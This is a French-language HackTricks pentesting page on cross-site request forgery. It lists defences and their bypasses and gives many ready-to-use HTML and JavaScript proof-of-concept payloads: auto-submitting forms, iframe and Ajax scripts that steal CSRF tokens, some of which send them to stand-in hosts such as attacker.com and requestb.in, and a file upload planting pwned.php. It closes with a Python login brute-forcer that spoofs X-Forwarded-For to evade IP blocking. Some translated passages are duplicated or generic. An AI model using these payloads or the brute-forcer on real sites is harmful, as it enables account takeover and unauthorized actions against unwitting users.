# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels sur les bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

## Qu'est-ce que le CSRF ?

La **falsification de requ√™te intersite** (√©galement connue sous le nom de CSRF) est une vuln√©rabilit√© de s√©curit√© Web qui permet √† un attaquant d'**induire les utilisateurs √† effectuer des actions qu'ils ne souhaitent pas effectuer**.\
Cela est fait en **faisant acc√©der un utilisateur connect√©** sur la plateforme victime √† un site Web contr√¥l√© par l'attaquant et √† partir de l√†, **ex√©cuter** du code JS malveillant, envoyer des formulaires ou r√©cup√©rer des "images" sur le **compte de la victime**.

### Pr√©requis

Pour pouvoir exploiter une vuln√©rabilit√© CSRF, vous devez d'abord **trouver une action pertinente √† exploiter** (changer le mot de passe ou l'e-mail, faire suivre la victime sur un r√©seau social, vous donner plus de privil√®ges...). La **session doit d√©pendre uniquement des cookies ou de l'en-t√™te d'authentification de base HTTP**, aucun autre en-t√™te ne peut √™tre utilis√© pour g√©rer la session. Enfin, il **ne doit pas y avoir de param√®tres impr√©visibles** dans la requ√™te.

Plusieurs **contre-mesures** peuvent √™tre mises en place pour √©viter cette vuln√©rabilit√©.

### **D√©fenses courantes**

* [**Cookies SameSite**](hacking-with-cookies/#samesite) : Si le cookie de session utilise ce drapeau, vous ne pourrez peut-√™tre pas envoyer le cookie √† partir de sites Web arbitraires.
* [**Partage de ressources entre origines**](cors-bypass.md) : Selon le type de requ√™te HTTP que vous devez effectuer pour exploiter l'action pertinente, vous pouvez tenir compte de la **politique CORS du site victime**. _Notez que la politique CORS n'affectera pas si vous voulez simplement envoyer une requ√™te GET ou une requ√™te POST √† partir d'un formulaire et que vous n'avez pas besoin de lire la r√©ponse._
* Demander √† l'utilisateur de saisir le **mot de passe** pour autoriser l'action.
* R√©soudre un **captcha**
* Lire les en-t√™tes **Referrer** ou **Origin**. Si une expression r√©guli√®re est utilis√©e, elle peut √™tre contourn√©e par exemple avec :
  * http://mal.net?orig=http://example.com (se termine par l'URL)
  * http://example.com.mal.net (commence par l'URL)
* **Modifier** le **nom** des **param√®tres** de la requ√™te Post ou Get
* Utiliser un **jeton CSRF** dans chaque session. Ce jeton doit √™tre envoy√© dans la requ√™te pour confirmer l'action. Ce jeton peut √™tre prot√©g√© avec CORS.

### Carte CSRF

![](<../.gitbook/assets/image (112).png>)

## Contournement des d√©fenses

### De POST √† GET

Peut-√™tre que le formulaire que vous voulez exploiter est pr√©par√© pour envoyer une **requ√™te POST avec un jeton CSRF mais**, vous devriez **v√©rifier** si un **GET** est √©galement **valide** et si lorsque vous envoyez une requ√™te GET, le **jeton CSRF est toujours valid√©**.

### Absence de jeton

Certaines applications **valident correctement le jeton lorsqu'il est pr√©sent mais sautent la validation si le jeton est omis**.\
Dans cette situation, l'attaquant peut **supprimer l'ensemble du param√®tre** contenant le jeton (pas seulement sa valeur) pour contourner la validation et effectuer une attaque CSRF.

### Le jeton CSRF n'est pas li√© √† la session utilisateur

Certaines applications ne **valident pas que le jeton appartient √† la m√™me session** que l'utilisateur qui effectue la demande. Au lieu de cela, l'application **maintient un pool global de jetons** qu'elle a √©mis et accepte tout jeton qui appara√Æt dans ce pool.\
Dans cette situation, l'attaquant peut se connecter √† l'application en utilisant son propre compte, **obtenir un jeton valide**, puis **fournir ce jeton √† l'utilisateur victime** dans son attaque CSRF.

### Contournement de la m√©thode

Si la requ√™te utilise une m√©thode "**bizarre**", v√©rifiez si la fonctionnalit√© de **remplacement de m√©thode** est en marche.\
Par exemple, si elle utilise une m√©thode **PUT**, vous pouvez essayer d'utiliser une m√©thode **POST** et **envoyer** : _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Cela peut √©galement fonctionner en envoyant le **param√®tre \_method** dans une requ√™te POST ou en utilisant les **en-t√™tes** :

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Contournement du jeton d'en-t√™te personnalis√©

Si la requ√™te ajoute un **en-t√™te personnalis√©** avec un **jeton** √† la requ√™te en tant que m√©thode de **protection CSRF**, alors :

* Testez la requ√™te sans le **jeton personnalis√© et √©galement l'en-t√™te.**
* Testez la requ√™te avec une **longueur exactement identique mais un jeton diff√©rent**.

### Le jeton CSRF est v√©rifi√© par un cookie

Dans une variation ult√©rieure de la vuln√©rabilit√© pr√©c√©dente, certaines applications **dupliquent chaque jeton dans un cookie et un param√®tre de requ√™te**. Ou ils **d√©finissent un cookie csrf** et **v√©rifient dans le backend si le jeton csrf envoy√© est celui qui est li√© au cookie**.

Lorsque la demande suivante est valid√©e, l'application v√©rifie simplement que le **jeton** soumis dans le **param√®tre de requ√™te correspond** √† la valeur stock√©e par le **cookie**.\
Dans cette situation, l'attaquant peut √† nouveau effectuer une **attaque CSRF si le site Web contient une vuln√©rabilit√© qui lui permettrait de d√©finir son cookie CSRF sur la victime comme un CRLF**.

Dans ce cas, vous pouvez d√©finir le cookie en essayant de charger une fausse image, puis lancer l'attaque CSRF comme dans cet exemple :
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```
{% hint style="info" %}
Notez que si le jeton csrf est li√© au cookie de session, cette attaque ne fonctionnera pas car vous devrez d√©finir votre session en tant que victime, et vous vous attaquerez donc vous-m√™me.
{% endhint %}

### Changement de Content-Type

Selon [**ceci**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), afin d'**√©viter les requ√™tes pr√©liminaires** en utilisant la m√©thode **POST**, ces valeurs de Content-Type sont autoris√©es :

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Cependant, notez que la **logique des serveurs peut varier** en fonction du **Content-Type** utilis√©, vous devriez donc essayer les valeurs mentionn√©es et d'autres comme **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemple (√† partir de [ici](https://brycec.me/posts/corctf\_2021\_challenges)) d'envoi de donn√©es JSON en tant que text/plain :
```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```
### Contournement de la requ√™te de pr√©-v√©rification pour application/json

Comme vous le savez d√©j√†, vous ne pouvez pas envoyer une requ√™te POST avec le Content-Type **`application/json`** via un formulaire HTML, et si vous essayez de le faire via **`XMLHttpRequest`**, une requ√™te de **pr√©-v√©rification** est envoy√©e en premier.\
Cependant, vous pouvez essayer d'envoyer les donn√©es JSON en utilisant les types de contenu **`text/plain`** et **`application/x-www-form-urlencoded`** juste pour v√©rifier si le backend utilise les donn√©es ind√©pendamment du Content-Type.\
Vous pouvez envoyer un formulaire en utilisant `Content-Type: text/plain` en d√©finissant **`enctype="text/plain"`**

Si le serveur n'accepte que le type de contenu "application/json", vous pouvez **envoyer le type de contenu "text/plain; application/json"** sans d√©clencher de requ√™te de pr√©-v√©rification.

Vous pouvez √©galement essayer de **contourner** cette restriction en utilisant un **fichier flash SWF**. Pour plus d'informations, [**lisez cet article**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Contournement de la v√©rification de Referrer / Origin

**√âvitez l'en-t√™te Referrer**

Certaines applications valident l'en-t√™te Referer lorsqu'il est pr√©sent dans les requ√™tes mais **passent outre la validation si l'en-t√™te est omis**.
```markup
<meta name="referrer" content="never">
```
**Bypasses Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Pour d√©finir le nom de domaine du serveur dans l'URL que le Referrer va envoyer dans les param√®tres, vous pouvez faire :
```html
<html>
  <!-- Referrer policy needed to send the qury parameter in the referrer -->
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```
***

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez des tutoriels sur les bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

## **Exemples d'exploitation**

### **Exfiltration du jeton CSRF**

Si un **jeton CSRF** est utilis√© comme **d√©fense**, vous pouvez essayer de l'**exfiltrer** en exploitant une vuln√©rabilit√© [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou une vuln√©rabilit√© [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET en utilisant des balises HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
D'autres balises HTML5 qui peuvent √™tre utilis√©es pour envoyer automatiquement une requ√™te GET sont :

![](<../.gitbook/assets/image (530).png>)

### Requ√™te GET de formulaire
```markup
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### Requ√™te POST de formulaire
```markup
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
```
### Requ√™te POST de formulaire via iframe
```markup
<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
### **Requ√™te POST Ajax**

---

#### **Description**

An Ajax POST request is a type of HTTP request that is sent using JavaScript to send data to a server and receive a response without reloading the entire page. This technique is commonly used in web applications to provide a more seamless user experience.

#### **Description**

Une requ√™te POST Ajax est un type de requ√™te HTTP envoy√©e √† l'aide de JavaScript pour envoyer des donn√©es √† un serveur et recevoir une r√©ponse sans recharger la page enti√®re. Cette technique est couramment utilis√©e dans les applications web pour offrir une exp√©rience utilisateur plus fluide.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```
### Requ√™te POST multipart/form-data
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```
### Requ√™te POST multipart/form-data v2
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Requ√™te POST de formulaire √† partir d'un iframe
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST**

Il est possible de voler le jeton CSRF d'un utilisateur en utilisant une attaque de type XSS ou en acc√©dant √† l'historique de navigation de l'utilisateur. Une fois que le jeton a √©t√© vol√©, il peut √™tre utilis√© pour envoyer une requ√™te POST malveillante en utilisant l'identit√© de l'utilisateur l√©gitime.

Pour ce faire, l'attaquant doit inclure le jeton CSRF vol√© dans la requ√™te POST. La requ√™te POST peut √™tre envoy√©e en utilisant un formulaire HTML ou en utilisant un script JavaScript.

Voici un exemple de code JavaScript qui envoie une requ√™te POST malveillante en utilisant le jeton CSRF vol√© :

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/transfer", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('X-CSRF-Token', '<jeton-csrf-vol√©>');
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        alert(xhr.responseText);
    }
}
xhr.send("amount=1000&toAccount=123456");
```

Dans cet exemple, le jeton CSRF vol√© est inclus dans l'en-t√™te de la requ√™te POST en utilisant la cl√© `X-CSRF-Token`. Les donn√©es de la requ√™te POST sont envoy√©es dans le corps de la requ√™te en utilisant la m√©thode `send()`.

Il est important de noter que cette attaque ne fonctionnera que si le site Web ne v√©rifie pas l'origine de la requ√™te. Si le site Web v√©rifie l'origine de la requ√™te en utilisant des en-t√™tes HTTP tels que `Origin` ou `Referer`, cette attaque ne fonctionnera pas.
```javascript
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Vol de jeton CSRF et envoi d'une requ√™te Post √† l'aide d'un iframe, d'un formulaire et d'Ajax**

Dans cette technique, l'attaquant utilise un iframe pour charger la page cible contenant le formulaire vuln√©rable. Ensuite, l'attaquant utilise JavaScript pour extraire le jeton CSRF du formulaire et l'envoyer √† son propre serveur. Enfin, l'attaquant utilise Ajax pour envoyer une requ√™te POST √† la page cible en utilisant le jeton CSRF vol√©.

Le code suivant montre comment cette technique peut √™tre mise en ≈ìuvre:

```html
<iframe id="target" src="https://example.com/vulnerable-form"></iframe>

<script>
  // Wait for the iframe to load
  document.getElementById('target').onload = function() {
    // Extract the CSRF token from the form
    var csrfToken = document.getElementById('target').contentWindow.document.getElementsByName('csrf_token')[0].value;

    // Send the CSRF token to the attacker's server
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker.com/steal-csrf-token');
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('csrf_token=' + csrfToken);

    // Send a POST request to the vulnerable form using the stolen CSRF token
    var form = document.createElement('form');
    form.setAttribute('method', 'POST');
    form.setAttribute('action', 'https://example.com/vulnerable-form');
    form.innerHTML = '<input type="hidden" name="csrf_token" value="' + csrfToken + '">';
    document.body.appendChild(form);
    form.submit();
  };
</script>
```

Il est important de noter que cette technique ne fonctionnera que si la page cible autorise les requ√™tes provenant d'un autre domaine √† acc√©der √† son contenu via un iframe.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST √† l'aide d'un iframe et d'un formulaire**

Dans cette technique, l'attaquant utilise un iframe pour charger la page cible contenant le formulaire qui sera soumis avec le jeton CSRF vol√©. Le formulaire est rempli avec les donn√©es n√©cessaires et soumis automatiquement √† l'aide de JavaScript. Cette technique est souvent utilis√©e pour effectuer des actions malveillantes telles que la modification de donn√©es ou la suppression de comptes.

Pour voler le jeton CSRF, l'attaquant peut utiliser diff√©rentes m√©thodes telles que l'injection de code JavaScript malveillant pour extraire le jeton de la page ou l'utilisation d'une attaque de type XSS pour voler le jeton √† partir du cookie de session.

Il est important de noter que cette technique peut √™tre d√©tect√©e et emp√™ch√©e en utilisant des mesures de s√©curit√© telles que l'utilisation de jetons CSRF avec une dur√©e de vie limit√©e, l'utilisation de l'attribut SameSite pour les cookies et la mise en place de politiques de s√©curit√© CSP pour emp√™cher l'ex√©cution de code JavaScript malveillant.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
```
### **Vol de jeton et envoi via 2 iframes**

Dans cette technique, nous allons utiliser deux iframes pour voler le jeton d'authentification de l'utilisateur et l'envoyer √† notre serveur. Tout d'abord, nous cr√©ons deux iframes, l'un pointant vers le site cible et l'autre pointant vers notre serveur. Ensuite, nous utilisons JavaScript pour extraire le jeton d'authentification de l'iframe cible et l'envoyer √† notre serveur via l'iframe de notre serveur. Cette technique est efficace car elle ne n√©cessite pas que l'utilisateur clique sur un lien ou effectue une action sp√©cifique, ce qui la rend difficile √† d√©tecter.
```markup
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```
### **POSTSteal du jeton CSRF avec Ajax et envoi d'un post avec un formulaire**
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>
```
### CSRF avec Socket.IO

Socket.IO est une biblioth√®que JavaScript qui permet une communication en temps r√©el entre le client et le serveur. Elle est souvent utilis√©e pour les applications de chat, les jeux en ligne et les tableaux de bord en temps r√©el.

Lorsque Socket.IO est utilis√© dans une application web, il est important de prendre en compte la possibilit√© d'une attaque CSRF. Les attaquants peuvent utiliser des requ√™tes WebSocket pour effectuer des actions malveillantes sur le compte de l'utilisateur sans son consentement.

Pour se prot√©ger contre les attaques CSRF avec Socket.IO, il est recommand√© d'utiliser des jetons CSRF. Les jetons CSRF peuvent √™tre g√©n√©r√©s c√¥t√© serveur et envoy√©s au client lorsqu'il se connecte √† l'application. Le client doit ensuite inclure ce jeton dans toutes les requ√™tes WebSocket qu'il envoie au serveur.

Le serveur peut alors v√©rifier que le jeton CSRF est pr√©sent et valide avant de traiter la requ√™te. Si le jeton CSRF est manquant ou invalide, le serveur peut rejeter la requ√™te et emp√™cher l'attaque CSRF.

Il est √©galement recommand√© d'utiliser des cookies s√©curis√©s pour stocker les jetons CSRF. Les cookies s√©curis√©s ne peuvent √™tre lus que par des connexions HTTPS, ce qui r√©duit le risque de vol de jetons CSRF par des attaquants.

En r√©sum√©, pour se prot√©ger contre les attaques CSRF avec Socket.IO, il est recommand√© d'utiliser des jetons CSRF g√©n√©r√©s c√¥t√© serveur et stock√©s dans des cookies s√©curis√©s. Le serveur doit v√©rifier que le jeton CSRF est pr√©sent et valide avant de traiter toute requ√™te WebSocket.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
```
## Brute Force de Connexion CSRF

Le code peut √™tre utilis√© pour effectuer une Brute Force sur un formulaire de connexion en utilisant un jeton CSRF (il utilise √©galement l'en-t√™te X-Forwarded-For pour tenter de contourner un √©ventuel blocage d'IP) :
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```
## Outils <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## R√©f√©rences

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Suivez HackenProof**](https://bit.ly/3xrrDrL) **pour en savoir plus sur les bugs web3**

üêû Lisez les tutoriels sur les bugs web3

üîî Recevez des notifications sur les nouveaux programmes de primes pour bugs

üí¨ Participez aux discussions de la communaut√©

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
